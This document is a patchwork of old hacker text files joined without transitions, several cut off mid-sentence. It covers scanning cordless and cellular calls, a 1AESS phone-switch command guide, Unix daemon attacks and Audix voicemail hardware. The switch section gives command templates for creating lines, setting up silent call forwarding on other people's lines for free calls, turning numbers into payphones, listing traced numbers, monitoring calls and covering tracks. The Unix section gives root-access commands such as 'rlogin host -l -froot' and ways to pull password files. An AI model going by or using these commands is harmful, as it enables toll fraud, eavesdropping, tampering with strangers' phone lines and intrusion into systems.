available.  Many older phones only utilize one pair.  Newer, more expensive,
phones can utilize all ten pairs.  Some automatically search for an open
channel, while others can be manually manipulated to find a channel with less
noise.  Likewise, the new 900MHz phones will scan to find a clear channel.


CELLULAR
--------
Legal Stuff:
Intercepting cellular mobile telephone (CMT) traffic is illegal.  The
Electronic Communications Privacy Act of 1986 made it so.  Scanners that
receive the CMT portion of the 800MHz range may no longer be manufactured,
sold, or imported into the U.S.  Many scanners were designed to scan this
area, though.  When the Cellular Telephone Industry Association began
complaining about this fact, most scanner manufacturers/resalers voluntarily
"blocked" the cellular freqs from their scanners.  This pacified the CTIA for
a while, but the "blocks" were easily hackable.  Typically, restoring a
"blocked" scanner involved removing a single diode, a ten minute job for even
the most devout technophobe.  This fact led to the passage of the Telephone
Disclosure and Dispute Resolution Act (TDDRA), which denies F.C.C.
certification of scanners that receive cellular freqs, or those which may be
easily modified to do so.  New scanners will be "blocked" at the CPU, and
hacking them is unlikely.  Frequency converters offered another means of
monitoring cellular and other 800MHz traffic.  Essentially, a converter
receives an 800MHz signal, and converts it to a 400MHz signal that the scanner
is capable of receiving.  Converters are useful for scanners that have no
800MHz reception capabilities, as well as those that have portions of the
800MHz band blocked.  Unfortunately, converters were also outlawed by the
TDDRA.  They are still legal in kit-form, however.  Another option would be
to build one from scratch, which isn't an especially difficult project.

Technical Stuff:
The word "cellular" defines the cellular phone system.  A service area is
broken up into many small cells.  As a user travels through an area, his call
will be handed off from one cell to the next.  This handoff is transparent to
the user, but a monitor will lose the conversation.  Cellular phones use low
power (a maximum of five watts) so that a cell phone will not attempt to seize
more than one site at a time.  When a call is initiated by a cell phone, the
nearest site will respond, and assign an available frequency to the phone.
When the user moves comes into range of the next site, the process repeats
itself, and the new site will assign a new frequency.  Therefore, it can be
difficult to track a particular conversation as it moves from site to site
with a single scanner.  Every area served by cellular phones will have two
service providers.  One will be the local RBOC, while the other will be a
cellular-only provider.  The two systems are designated as "A" and "B"
systems, or "Wireline" and "Non-Wireline".  There is no difference between
the two for monitoring purposes, but since "A" and "B" carriers use different
frequencies, it should be possible to identify local cell-towers as being "A"
or "B" sites.


PHONE PATCH
-----------
Legal Stuff:
The Communications Act of 1934 applies here as well, but there are no other
prohibitions on monitoring business-band phone patches.

Technical Stuff:
Many business radio systems have the ability to tie into the phone
system.  Most of these systems will be found in 800MHz trunked
radio systems.  In a conventional radio system, one frequency will
equal one channel.  In a trunked system, however, frequencies and
channels are independent of each other.  The trunking computer will
assign a different frequency to a radio each time it transmits,
and it will send a signal to other radios on the same channel,
telling them the current frequency in use.  Phone patches are easy
to monitor, though.  Since the radio on a phone patch is
transmitting constantly, the frequency used will remain the same
for the duration of the conversation.  Many people mistakenly
believe these calls to be cellular, but they are not.  Most phone
patches found in 800MHz trunked systems will be full-duplex, just
like cellular and home phones.  Some systems, especially in UHF
(around 450MHz) and 800MHz conventional radio systems will only be
half-duplex, though.  In those systems, only one person call talk
at a time, just like normal two-way radios.  Radio systems are
typically designed to offer service to an entire metropolitan area,
so range is quite good.  The mobile radio will transmit its signal
to a strategically located "repeater", which then re-broadcasts the
signal with much more power.  So long as a scanner is within
reception range of the repeater output, monitoring will be possible
regardless of the location of the party transmitting.



EQUIPMENT
----------
Legal Stuff:
Some states prohibit mobile use of scanners.  Also, it is illegal
to use a scanner in the commission of a crime.

Technical Stuff:
There is a scanner for every appetite.  What sort of monitoring
one wants to do will dictate which scanner one buys.  For someone
interested only in cordless phones, a ten-channel scanner with no
800MHz coverage will be quite adequate, and much cheaper than a
more capable scanner.  For someone interested in cellular, a full-
coverage 800MHz scanner with a much greater frequency storage
capacity will be necessary.  Base, mobile or handheld?  Depends
entirely on how it will be used.  Modern scanners are programmable,
while older units require crystals.  For someone wanting to monitor
only a few channels (such as cordless phones, or the local police),
a crystal-controlled scanner would be adequate, and much cheaper.
But for more serious and varied scanning, programmable units are
a necessity.  Models are available that store between 10 and 1000
channels.  Uniden/Bearcat and Realistic are the two most commonly
available brands in the U.S. (although Realistic isn't actually a
brand, just a label...Radio Shack scanners are all manufactured by
Uniden or GRE, depending on the model).  Because of the TDDRA, many
of the best scanners from the past several years are no longer
available, but watch for Hamfests (great electronic flea-
markets...inquire at your local ham radio/electronics store),
garage sales, etc.  There is nothing in the TDDRA or other current
legislation that prevents private parties from owning or selling
pre-TDDRA equipment.  Aside from the scanner itself, the next-most
important piece of equipment is the antenna.  Handheld scanners
will generally utilize an "all-band" rubber-duck antenna (a
flexible, rubberized antenna, between 8-14" in length), while base
units will have a telescoping metal whip antenna.  These antennas
are adequate for receiving strong, local signals, but more
discriminating monitors will demand more.  For base units, an all
band discone type antenna, mounted outside as high as practical,
will offer good, omnidirectional performance.  For those who only
want to monitor a particular band, it would be best to use an
antenna cut specifically for that band.  Likewise, for those
monitoring signals coming from one general direction, a directional
antenna will offer better performance than an omnidirectional unit.
For mobile use, using an antenna mounted on the vehicle will
greatly improve reception.


MISCELLANEOUS COMMUNICATIONS
----------------------------
Voice-pagers can offer interesting monitoring.  While the data-
transmissions that send the signal to the proper pager are
proprietary digital signals (and as such, illegal to monitor or
decipher), the actual "voice messages" are transmitted "in the
clear".
Packet-radio is used by ham radio operators.  They have a vast
network of computer bbs's that operate independently of the phone
system.  Modulated data is sent over the airwaves with a ham
transceiver, where it is received and de-modulated with a Terminal
Node Controller (TNC).  Expect the use of wireless data
transmissions to increase over the next few years, and not just
among ham operators.
While not having anything to do with telephones, the "baby
monitors" people use are transmitters just like cordless phones.
They are also low-power devices, so range is limited.  Most people
who use these devices would be shocked to learn that they are
"bugging" their own home.

PRESENT AND FUTURE CHALLENGES
-----------------------------
Spread spectrum, digital transmissions, encryption...these are all
factors that are affecting monitoring today.  While most cellular
systems are presently analog systems, there are operational digital
systems in some areas.  Scanners that are currently available won't
be able to decipher the digital communications, and it is unlikely
that digital-capable scanners will be produced.  That means it will
be up to the hackers to provide the technology to intercept these
communications.  Spread spectrum is quite hackable, as it was never
intended as an encryption system, per se, yet the phone
manufacturers are certainly marketing it as such.  And one oft
overlooked advantage of the Clipper chip is the fact that the
backdoor can be exploited by hackers as well as the government.
In the meanwhile, there are plenty of intercepts to be had, and
there will continue to be.

CHART 10 - IMPROVED ANTENNA FOR CORDLESS MONITORING

The best way to improve the range for monitoring cordless
telephones is to use an antenna specifically cut for the
frequencies used in cordless phones.  The following is a very
effective, yet easy to build, "homebrew" antenna.

CORDLESS DIPOLE
---------------
materials needed:
wire - virtually any type will suffice
matching transformer (RS part number 15-1296)
f connector (RS part number 278-225)
??? connector (this will connect the antenna to the scanner, so it
     will be dependant upon what type of antenna jack the scanner
     utilizes.  Most use a BNC-type connector.  Some older models
     will use a Motorola-type connector.)
coax cable - while many types of coax can be used, a low-loss cable
     would be best, especially if a long cable run is required.
     RG-6 satellite coax (RS part number 278-1316) is a good choice.

Introduction
-=-=-=-=-=-=
The Bell System's first trial of electronic switching took place in Morris,
Illinois, in 1960.  The Morris trial culminated a 6-year development and
proved the viability of the stored-program control concept.  The first
application of electronic local switching in the Bell System occurred in May
1965 with the cutover of the first 1ESS switch in Succasunna, New Jersey.

The 1ESS switching system was designed for use in areas where large numbers
of lines and lines with heavy traffic (primarily business customers) are
served.  The system has generally been used in areas serving between 10,000
and 65,000 lines and has been the primary replacement system for urban
step-by-step and panel systems.  The ease and flexibility of adding new
services made 1ESS switching equipment a natural replacement vehicle in
city applications where the demand for new, sophisticated business and
residence services is high.

In 1976, the first electronic toll switching system to operate a digital
time-division switching network under stored-program control, the 4ESS
system, was placed in service.  It used a new control, the 1A processor,
for the first time to gain a call carrying capacity in excess of 550,000
busy-hour calls.  The 1A processor was also designed for local switching
application.  It doubled the call-carrying capacity of the 1ESS switching
system and was introduced in 1976 in the first 1AESS switch.  The network
capacity of 1ESS switching equipment was also doubled to allow the 1AESS
switch to serve 130,000 lines.

In addition to local telephone service, the 1AESS switches offer a variety
of special services.  Custom Local Area Switching Services (CLASS) are
available as well Custom Calling Services.  Business customers may select
offerings such as centrex, ESS-ACS, Enhanced Private Switched Communications
Service, or electronic tandem switching.

Although more modern switches like 5ESS and DMS 200 have been developed, it
is estimated that some 50 percent of all switches are still 1AESS.

Commands
-=-=-=-=
The 1AESS uses a command line interface for all commands.  The commands are
divided into three fields:  action, identification, and data.  The fields
are always separted by a colon.  Every command is terminated by either a
period for verification commands or a 'ballbat' (!) for change commands.
The control-d is used to execute the command instead of a return.  The
underscore is used as a backspace.  Commands are always typed in 'all caps'.

The action field is the first field of the command and is ended by a colon.
The identification field is ended by the second colon.  The identification
field has one or two subfields which are separated by a semicolon.  Semicolons
are not used elsewhere in the command.  The data field consists of keyword
units and is the remaining portion of the command.

Basic Machine Commands
-=-=-=-=-=-=-=-=-=-=-=
These commands provide useful information from the system.  The WHO-RV-
command will tell you what CO it is and what version of the OS is installed.
If your output is scrolling off the screen press space to end scrolling.
The V-STOP- command will clear the buffer.

WHO-RV-.                  System information.
SPACE                     Stops output from scrolling.
V-STOP-.                  Free buffer of remaining LENS/INFO.

Channel Commands
-=-=-=-=-=-=-=-=
Channel commands are used to redirect input and output.  If a switch won't
respond to a command use the OP:CHAN command to check on current channel.
If your channel is not responding, use the MON:CHAN command to switch output
and control to your terminal (the remote).  You can check the status of the
RC with the RCCENSUS command.

OP:CHAN:MON!                   Shows all channels which are being monitored.
MON:CHAN SC1;CHAN LOC!         Redirect output to remote screen.
STOP: MON;CHAN SC1;CHAN LOC!   Redirect output to local screen.
                               (This command needs to be done after you
                               are finished to help cover your tracks)
OP:RCCENSUS!                   To see recent change status.


Tracing Commands
-=-=-=-=-=-=-=-=
CI-LIST- will give you a list of all numbers which are being traced
externally.  It will not show you lines which are being traced
internally, ie: numbers inside one of the prefixes controlled
by the switch you are on.

CI-LIST-.                 Traced line list.


Check Features on Line
-=-=-=-=-=-=-=-=-=-=-=
The VF command is used to check the current settings on a line.
The DN XXXXXXX specifies the phone number of the line you wish to check.
Replace XXXXXXX with the seven digit phone number of the line you are
checking.

VF:DNSVY:FEATRS,DN XXXXXXX,1,PIC!       Check features of a line.
VF:DNSVY:DN XXXXXXX,1,LASFTRS!          Display last Features

          Call Features   CWT- Call Waiting
                          CFB- Call Forward Busy - Busy=VM
                          CFV- Call Forwarding Variable
                          CFD- Call Forward Don't answer
                          TWC- Three Way Calling

                          PXX- Block all LD service (guess)
                          MWI- Message Waiting Indicator
                          CHD- centrex(unremarkable)
                          CPU- centrex(unremarkable)
                          CLI- Calling Line Identification (CID)
                          ACB- Automatic Call Back Feature (?)
                          BLN- Special Toll Billing
                          FRE- Free Calling

The standard output of a command appears below.  The 'DN 348 2141' specifies
the number you are checking.  The calling features will be listed on the
second line by their three letter acronyms.  This line has call waiting
(CWT), a trace (TRC), and touch tone dialing (TTC).

Example of 1A output:

M 53 TR75 2 DN 348 2141 00000003
              CWT  TRC  TTC


Searching For Free Lines
-=-=-=-=-=-=-=-=-=-=-=-=
The VFY command can be used to check if a line is in use.  The output will
list the LEN (Line Equipment Number) for the line and its call features in
octal.  If the LEN is all zeros, then that number has not been assigned.
Replace XXXXXXX with the number you wish to check.  You must prefix the
phone number with 30.  You can also check for unused LEN's using the VFY
command.  Use the space bar to stop scrolling and the V-STOP command to
cancel when looking up free LEN's.

VFY-DN-30XXXXXXX.               Search for free lines.
VFY-LEN-4100000000.             List all free LENs.
VFY-TNN-XXXXXXXX.               To get information on trunk.

The output for the VFY-DN command will appear like the one below.  Notice

that this number has been assigned a LEN so it is in use.

M 06 TR01 796 9146
         0 0 0 0
         LEN 01 025 000
         001 000 000 000 000 000 4
         000 000 000 000 000 000 000 000
         0 0 0 0
         0 0 0 0 0


Searching for a Particular Feature on a Line (like trace)
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
All line information is stored in the switch for its coverage area.  The
switch is like a huge database in this sense.  You can do global searches
on the switch for any feature.  One especially interesting feature to search
for are traced numbers.  Traced numbers listed this way are INTERNALLY
traced as opposed to globally traced numbers shown with the CI-LIST- command.
Global and internal trace lists are always very different.  And remember,
be a good samaritan and call the person being traced and let them know!  ;-)

VF:DNSVY:FEATRS,EXMATCH TRACE!          Pull all numbers IN switch area with
                                        trace on it (takes a sec).

You can exmatch for any LASS feature by replacing the keyword TRACE with any
call feature like call forwarding (CFB) and speed calling (SC1).


To See What Numbers Are on a Speed Calling List
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Another nice use for the VFY command is to see what is on a line's speed
calling list.  Replace XXXXXXX with the target phone number.  One devious
use is to look at the CO's speed call list to find other internal telco
numbers.

VFY-LIST-09XXXXXXX020000
         09=mask  02=single list  (one digit speed calling)
                  20=double list  (two digit speed calling)
                  28=     "                   "
                  36=     "                   "
                  44=     "                   "


To Build a Line
-=-=-=-=-=-=-=-
The recent change command (RC) is used to create and modify lines.  Because
RC commands are usually very long and complex, they are typed on multiple
lines to simplify them.  Each subfield of the data section of the command is
typed on a separate line ended by a slash (\) followed by pressing ctrl-d.
To create a line, you specify LINE in the identification field.  Before
a line can be created, you must first locate an unused number by using the
VFY-DN command explained above.  Once a free number has been found, you
use the VFY-LEN to find an available LEN.  To build a new line, follow
these steps:

First, find spare LEN (VFY-LEN-4100000000.).  Next find free line. Now type
in the RC commands using the following commands as a template:

RC:LINE:\         (create a line)
ORD 1\            (execute the command immediately)
TN XXXXXXX\       (telephone number)
LEN XXXXXXXX\     (len found from above)
LCC 1FR\          (line class code 1fr)
CFV\              (call forward)
XXX 288\          (type XXX, space, then the three digit PIC)

Creating Call Forwarding Numbers
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
The call forwarding feature is the most important feature for hackers.  By
creating a line or modifying an existing line with call forwarding, you can
than use it to make free phone calls.  You set the line to call forward/
no ring and then give it the call forwarded number.  This will allow you
to call the modified line and be instantly forwarded to your pre-chosen
destination.

First create a line using RC:LINE:, then modify the line using the following
commands as a template.

RC:CFV:\          (add call forwarding to a line.. begin: )
ORD 1\            (execute the command immediately)
BASE XXXXXXX\     (base number you are changing)
TO XXXXXXX\       (local - XXXXXXX : ld - XXXXXXXXXX )
PFX\              (set prefix to 1 if ld)
!                 (BEWM)


To Change Call Forward Number
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
It is safer to modify an existing call forward than to create a new line
solely for this purpose.  You can use the VFY command and EXMATCH for CFB to
find lines with call forwarding.  Before you can change the call forwarding
'TO' number you must delete the old one.  Remove call forward number using
CFV:OUT with the template below.

RC:CFV;OUT:\      (remove call forward number...begin: )
ORD 1\            (execute command immediately)
BASE XXXXXXX\     (number to remove it from)
!                 (Yeeee-Hahhhahah)


Make Call Forward Not Ring
-=-=-=-=-=-=-=-=-=-=-=-=-=
The only drawback to call forwarding off someone's line is if rings they
might answer.  To get around this, you add the call-forward no-ring option
(ICFRR) using the following as a template.

RC:LINE;CHG:\     (recent change line to be specified)
ORD 1\            (execute command immediately)
TN XXXXXXX\       (number you wanna fuck with)
ICFRR\            (this takes the ring off)
!                 (Go!)


Adding a feature to a line
-=-=-=-=-=-=-=-=-=-=-=-=-=
The RC:LINE;CHG: can also be used to add any other call feature.  Use the
same template but change the feature.

RC:LINE;CHG:\     (this is used for changing features)
ORD 1\            (order number)
TN XXXXXXX        (telephone number you are fucking with)
TWC\              (replace this with any feature you wish)
!                 (Fire!)


Removing a Feature
-=-=-=-=-=-=-=-=-=
Use the NO delimiter to remove a feature from a line.

RC:LINE;CHG:\     (change a feature)
ORD 1\            (effective immediately)
TN XXXXXXX\       (telephone number)
CFV NO\           (feature followed by NO)
!                 (Boo-Ya!)


Change Phone number into payphone
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
You've read about in the Hacker Crackdown, now you too can be 31337 and
change Gail Thackery's phone into a payphone.  In fact you can change the
line class code (LCC) to anything you want.  To display the LCC of a line
use the following and replace the XXXXXXX with the line you wish to view.

VF:DNSVY:LCC,DN XXXXXXX,1,PIC!    (display line class code)
                                   DTF = Payphone
                                   1FR = Flat Rate
                                   1MR = Measured Rate
                                   1PC = One Pay Phone
                                   CDF = DTF Coin
                                   PBX = Private Branch Exchange
                                   CFD = Coinless(ANI7) Charge-a-call
                                   INW = InWATS  (800!@#)
                                   OWT = OutWATS
                                   PBM = O HO/MO MSG REG (NO ANI)
                                   PMB = LTG = 1 HO/MO (Regular ANI6)
                                   (ani6 and ani7 - only good for DMS)

To change the line into a payphone use the RC:LINE;CHG command and modify
the LCC like the example below.

RC:LINE;CHG;\     (this is used for changing features)
ORD 1\            (order number)
TN XXXXXXX\       (telephone number you are fucking with)
LCC DTF\          (line class code you are changing to)
!                 (Make it so.)

*(You may have to remove some LASS features when doing this)*


To Kill a Line and Remove It Permanently
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
If you need to delete a line you have created (or haven't) use the following
syntax.

RC:LINE;OUT:\     (remove line)
ORD 1\            (effective immediately)
TN XXXXXXX\       (on this number)
!                 (GO!)


Monitoring Phone Calls
-=-=-=-=-=-=-=-=-=-=-=
There are powerful utilities to monitor calls and affect phone lines
available on a 1A.  The T-DN- commands allow you to check the current
status of line and make it busy or idle.  If a line happens to be active
you can use the NET-LINE- command to trace the call and find the numbers
for both calling parties.

T-DN-RD XXXXXXX.                See if call in progress.
                                        output:  =1 line busy
                                                =0 line idle
T-DN-MB XXXXXXX.                Make line busy.
T-DN-MI XXXXXXX.                Make line idle.
NET-LINE-XXXXXXX0000.           To do a live trace on a phonenumber thru
                                switch.
NET-TNN-XXXXXX                  Same as above for trunk trace

Internet hosts communicate with each other using either TCP
(Transmission Control Protocol) or UDP (User Datagram Protocol) on top
of IP (Internet Protocol).  Other protocols are used on top of IP, but
TCP and UDP are the ones that are of interest to us.  On a Unix system,
the file /etc/protocols will list the available protocols on your
machine

On the Session Layer (OSI model) or the Internet Layer (DOD Protocol
Model) data is moved between hosts by using ports.  Each data
communication will have a source port number and a destination port
number.  Port numbers can be divided into two types, well-known ports
and dynamically allocated ports.  Under Unix, well-known ports are
defined in the file /etc/services.  In addition, RFC (Request For
Comments) 1700 "Assigned Numbers" provides a complete listing of all
well-known ports.  Dynamically allocated port numbers are assigned as
needed by the system.

Unix provides the ability to connect programs called daemons to
well-known ports.  The remote computer will connect to the well-known
port on the host computer, and be connected to the daemon program.

Daemon programs are traditionally started by inetd (The Internet
Daemon).  Daemon programs to be executed are defined in the inetd
configuration file, /etc/inetd.conf.

Most of these daemons run as a priveledged user, often as root.  Many of
these programs have vulnerabilities which can be exploited to gain access
to remote systems.

The daemons we are interested in are:

the reader.



 --> ftp              21    File Transfer [Control]

FTP is the File Transfer Protocol.  FTP requests are answered by the FTP
daemon, ftpd.  wuarchive's ftpd versions below 2.2 have a vulnerability
where you can execute any binary you can see with the 'site exec'
command by calling it with a relative pathname with "../" at the
beginning.  Here is a sample exploit:

Login to the system via ftp:

        220 uswest.com FTP server (Version wu-2.1(1) ready.

--> smtp             25    Simple Mail Transfer Protocol

Mail attacks are one of the oldest known methods of attacking Internet
hosts.  The most common mail daemon, and least secure, is sendmail. Other
mail daemons include smail, MMDF,and IDA sendmail.  Sendmail has had too
many vulnerabilities to list them all.  There is an entire FAQ written
specifically on sendmail vulnerabilities, therefore we will not cover them
heavily here.

One well known vulnerability, useful only for historical purposes, is
"Wizard Mode."  In Wizard mode you could request a shell via Port 25
(The SMTP port).  No modern system will be vulnerable to this attack.  To
exploit this vulnerability, you telnetted to port 25, typed WIZ to enter
Wizard mode, and entered the password.  The problem related to the way
the encrypted password was stored.  There was a bug that caused the
system to believe that no password was as good as the real password.

To quote Steven Bellovin:

        The intended behavior of wizard mode was that if you supplied
        the right password, some other non-standard SMTP commands were
        enabled, notably one to give you a shell.  The hashed password
        -- one-way encrypted exactly as per /etc/passwd -- was stored in
        the sendmail configuration file.  But there was this bug; to
        explain it, I need to discuss some arcana relating to sendmail
        and the C compiler.

        In order to save the expense of reading and parsing the
        configuration file each time, sendmail has what's known as a
        ``frozen configuration file''.  The concept is fine; the
        implementation isn't.  To freeze the configuration file,
        sendmail just wrote out to disk the entire dynamic memory area
        (used by malloc) and the `bss' area -- the area that took up no
        space in the executable file, but was initialized to all zeros
        by the UNIX kernel when the program was executed.  The bss area
        held all variables that were not given explicit initial values
        by the C source. Naturally, when delivering mail, sendmail just
        read these whole chunks back in, in two giant reads.  It was
        therefore necessary to store all configuration file information
        in the bss or malloc areas, which demanded a fair amount of care
        in coding.

        The wizard mode password was stored in malloc'ed memory, so it
        was frozen properly.  But the pointer to it was explicitly set
        to NULL in the source:

        char    *wiz = NULL;

        That meant that it was in the initialized data area, *not* the
        bss. And it was therefore *not* saved with the frozen
        configuration.  So -- when the configuration file is parsed and
        frozen, the password is read, and written out.  The next time
        sendmail is run, though, the pointer will be reset to NULL.
        (The password is present, of course, but there's no way to find
        it.)  And the code stupidly believed in the concept of no
        password for the back door.

        One more point is worth noting -- during testing, sendmail did
        the right thing with wizard mode.  That is, it did check the
        password -- because if you didn't happen to do the wizard mode
        test with a frozen configuration file -- and most testing would
        not be done that way, since you have to refreeze after each
        compilation -- the pointer would be correct.



 --> tftp             69    Trivial File Transfer Protocol

tftp is the Trivial File Transfer Protocol.  tftp is most often used to
attempt to grab password files from remote systems.  tftp attacks are so
simple and repetitive that scripts are written to automate the process
of attacking entire domains.  Here is one such script:

 --> finger           79    Finger

The finger command displays information about another user, such as login
name, full name, terminal name, idle time, login time, and location if
known.  finger requests are answered by the fingerd daemon.

Robert Tappan Morris's Internet Worm used the finger daemon.  The finger
daemon allowed up to 512 bytes from the remote machine as part of the
finger request.  fingerd, however, suffered from a buffer overflow bug
caused by a lack proper bounds checking.  Anything over 512 got
interpreted by the machine being fingered as an instruction to be
executed locally, with whatever privileges the finger daemon had.



 --> www-http         80    World Wide Web HTTP

HTML (HyperText Markup Language) allows web page user to execute
programs on the host system.  If the web page designer allows the web
page user to enter arguments to the commands, the system is vulnerable
to the usual problems associated with system() type calls.  In addition,
there is a vulnerability that under some circumstances will give you an
X-Term using the UID that the WWW server is running under.



 --> sunrpc          111    SUN Remote Procedure Call

Sun RPC (Remote Procedure Call) allows users to execute procedures on
remote hosts.  RPC has suffered from a lack of secure authentification.
To exploit RPC vulnerabilities, you should have a program called "ont"
which is not terribly difficult to find.



 --> login           513   Remote login

Some versions of AIX and Linux suffer from a bug in the way that
rlogind reads arguments.  To exploit this vulnerability, issue this
command from a remote system:

rlogin host -l -froot

Where host is the name of the target machine and username is the username
you would like to rlogin as (usully root).  If this bug exists on the
hosts system, you will be logged in, without being asked for a password.



 --> rsh-spx         222    Berkeley rshd with SPX auth

Some versions of Dynix and Irix have a bug in rshd that allows you to
run commands as root.  To exploit this vulnerability, issue this command
from the remote system:

rsh host -l "" /bin/sh



 --> netinfo         716-719    NetInfo

NeXT has implemented a protocol known as NetInfo so that one NeXT
machine can query another NeXT machine for information.  A NetInfo
server will by default allow unrestricted access to system databases.
This can be fixed by the System Administrator.  One of the pieces of
information netinfo will give up is the password file.



 --> ibm-res         1405   IBM Remote Execution Starter

rexd (the remote execution daemon) allows you to execute a program on
another Unix machine.  AIX, NeXT and HPUX versions of rexd have suffered
from a vulnerability allowing unintended remote execution. The rexd
daemon checks your uid on the machine you are coming from, therefore you
must be root on the machine you are mounting the rexd attack from.  To
determine if your target machine is running rexd, use the 'rcp -p
<target>' command.  You will also need the exploit program known as 'on'
which is available on fine H/P boards everywhere.



 --> nfs             2049            Network File System

NFS, the Network File System, from Sun Microsystems has suffered from
multiple security vulnerabilities.  In addition, many system
administrators configure NFS incorrectly, allowing unintended remote
access.

Using the command 'showmount -e <target>' you can view what file systems
are exported from a machine.  Many administrators allow read access to
the /etc directory, allowing you to copy the password file. Other
administrators allow write access to user directories, allowing you to
create .rhosts files and gain access to the machine via rlogin or rsh.

In addition to configuration issues, NFS is vulnerable to attacks using
a uid masking bug, a mknod bug, and a general file handle guessing
attack.  Several hacked versions of the mount command have been written
to exploit known vulnerabilities.



 --> x11             6000-6063       X Window System

X-Windows has suffered and currently suffers from numerous
vulnerabilities. One vulnerability allows you to access another users
display, another allows you to view another users keystrokes.  Another
vulnerability allows a remote attacker to run every program that the
root user starts in his or her .xsession file.  Yet another X-Windows
vulnerability allows a local user to create a root entry in the
/etc/passwd file.



 --> rcp

The SunOS 4.0.x rcp utility can be exploited by any trusted host listed
in /etc/hosts.equiv or /.rhosts.  To exploit this hole you must be
running NFS (Network File System) on a Unix system or PC/NFS on a DOS
system.



 --> NIS

Sun's NIS (Network Information Service) also known as yp (Yellow Pages)
has a vulnerability where you can request an NIS map from another NIS
domain if you know the NIS domain name of the target system.  There is
no way to query a remote system for it's NIS domainname, but many NIS
domain names are easily guessable.  The most popular NIS map to request
is passwd.byname, the NIS implementation of /etc/passwd.  In addition,
if you have access to a diskless Unix workstation, you can determine the
NIS domain name of the server it boots from.

        +--------------------------------------------------------+
        + Do not confuse NIS domain names with DNS domain names! |
        +--------------------------------------------------------+



 --> Other attacks

In addition to these daemon based attacks, many other methods can be
used to gain access to a remote computer.  These include, but are not
limited to: default accounts, password guessing, sniffing, source
routing, DNS routing attacks, tcp sequence prediction and uucp
configuration exploits.

This should give you an idea on how daemon based attacks function.  By
no means is this a complete list of security vulnerabilities in
privileged internet daemons.  To discover more information about how
these daemons operate, and how to exploit their vulnerabilities, I
highly recommend reading source code, man pages and RFC's.

- " What?! Another crummy file on the Audix voice mail? "

Not exactly. In COTNO #1, you will find a good article on identifying and
obtaining mailboxes on the Audix Voice Mail System (VMS). This paper will
discuss the physical/electrical design of the Audix System and how it's
integrated with the Definity switch. I will not discuss how to obtain
dialups to the audix or hacking it, that's another file :). Most of the
information and diagrams in this paper where gathered from various sources.
Mainly, the AT&T Tech. Journal may/june 1994, and some very cooperative AT&T
representatives. ;)


1) Hardware
-----------

All right, what does this baby look like? Well, all in all, it's quite simple.
There are 4 major components, all of which can be easily replaced or removed.
A tape drive, a hard disk and 2 circuit boards. Here's what the Definity Audix's
front panel looks like.

As you can see, it consists of two boards: The multifunction board (right), and
the disk/alarm board (left).

o MFB major components:

        - A 386 processor  (supports Unix System V) with 16 megs of dynamic
          RAM (DRAM).
        - An array of six 50 mhz digital signal processors (DSPs).
        - The Definity switch time-division multiplexed (TDM) bus interface.
        - An alarm monitoring processor. :(

o D/ALB major components:

        - A tape drive
        - A Hard Drive
        - An online modem for REMOTE ALARM NOTIFICATION, AND REMOTE MAINTENANCE.


The modem is included with the package. If the on-board modem does not
comply with the local telco rules (for example foreign countries) , than
through the RS-232 port an external one can be attached. Let's take a deeper
look inside and see where the components go.

The Definity Audix VMS is so compact because it has to fit in the Definity
PBX's port slot. It can: detect a incoming call, detect when the caller has
disconnected, disconnect a call on ANY port. It can also, disable any port to
prevent it from receiving incoming calls, and most important of all, it can
originate outgoing calls. It is also good to know that it has CLID.
Here's a list of it's functions:

        - Call History Information (Called Party ID,Calling party ID and
                             reason for call).
        - Integrated message waiting notification (LED).
        - Disconnect message (Contact Administrator for help, please disconnect
                             goodbye).
        - Message waiting status information (Updated on activity, Audit of
                             each vmb and refresh of all vmbs).
        - Maintenance info. for link.
        - Audix control of port. (disconnect call, detect caller, etc..)

I've been referring to it as the Definity Audix, and not just Audix. Audix,
(aka Audix release 1), was first introduced in 1984. The Definity Audix,
however, was introduced in 1992, and came with a series of more advanced
features. For example, the time scale modification option was improved, allowing
the playback of messages at slower or faster speeds. Or the speech
encoder/decoder algorithm which was changed resulting in better sound quality
(so they say). How can you tell if it's a Definity when calling it remotely?
Well, quite frankly I'm not sure. There is a way, however, it isn't very easy to
apply. The Audix, release 1 system takes approx. 1 second to detect your DTMF
tones. Now, the Definity, on the other hand, takes only about 25 milliseconds,
less than half the time. You can time the reaction, and figure out what your
dealing with, but there are many things that can affect the response time also
(for example, the amount of people using the voice mail). As you can see
this method isn't very reliable.

2) Software
-----------

The system software resides on a single 160 meg casettee tape. It is loaded
on the hard disk whenever an installation or upgrade is being performed.
There is also a big part of the code, which constantly monitors multiple
thermal sensors on the two circuit packs, making sure that they don't over
heat.

The chick's sweet voice you hear when interacting with the VMS, is composed
of multiple fragments. A fragment can be a single word, a complete sentence,
or a bunch of sentences. For example, "Please enter extension and pound sign"
is most likely to be two fragments. The first being "please enter extension"
and the second being "and pound sign". Obviously, this is used to save space.
A second recording is: "Enter password and pound sign", the "and pound sign"
is the same fragment as in the first one. Since AT&T sells it's Audix system
in nearly 80 countries, there are a couple of different language tapes also.
So don't be surprised if you encounter a Spanish or Japanese Audix VMS.
Currently AT&T offers ten language tapes and the Definity Audix can support
up to nine different language tapes simultaneously.


"So if it's an Audix voice mail then there's a Definity PBX, right? "

Wrong. Even though it fits the Definity PBX like a glove, it can be integrated
with other switches. Some of the most common are:

        - G3I        - System 25
        - G3S        - System 75
        - G3R        - System 85

I'm not sure about NorTel switches such as the SL-1, some people say yes,
while others say that only AT&T switches can be integrated with Audix. If
anyone knows, please let me know. Comments or suggestions are welcome.

INTRODUCTION
------------
First of all I wrote this because for one thing I am SICK AND TIRED of sitting
on irc and seeing "k0nPhiNf0!?" pumped through my terminal every five seconds.
Then,once they get the k0nPh iNf0, I am forced to constantly hear from the
k0nPh people about how "DiZ k0nPh sUx!". People give me k0nPh info all the
time but I NEVER call into them.  Why?  Because these days,they DO suck.  It
seems the underground world have completely forgotten about what use to be
the best way to conference - BRIDGE's.


ABOUT BRIDGES
-------------
I'm sure everyone reading this knows what a bridge is.  Whether they know the
best way to get them is another thing.  I do, however, run across the
occasional irc'er that /msgs me with "whats a bridge?" when I bring up the
subject.

Bridges are just about the same as k0nPhz, except they are usually owned and
used by big businesses and schools on their own telephone equipment.  This
